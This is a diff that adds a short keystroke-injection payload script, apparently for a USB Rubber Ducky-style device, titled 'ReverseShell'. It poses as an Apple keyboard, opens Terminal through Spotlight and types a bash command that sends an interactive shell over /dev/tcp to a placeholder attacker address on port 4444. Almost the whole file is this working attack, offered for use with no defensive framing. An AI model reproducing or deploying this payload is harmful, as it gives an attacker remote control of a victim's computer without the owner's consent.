@@ -1,0 +1,16 @@
+REM Title: ReverseShell
+REM Author: NANDOFROMTHEBANDO
+REM Description: Opens terminal and sets up a nc reverse shell on port 4444
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 2000 
+STRING /bin/bash -c 'exec /bin/bash -i >/dev/tcp/IP_Desired_From_Attacker/4444 0<&1 2>&1'
+DELAY 1000
+ENTER
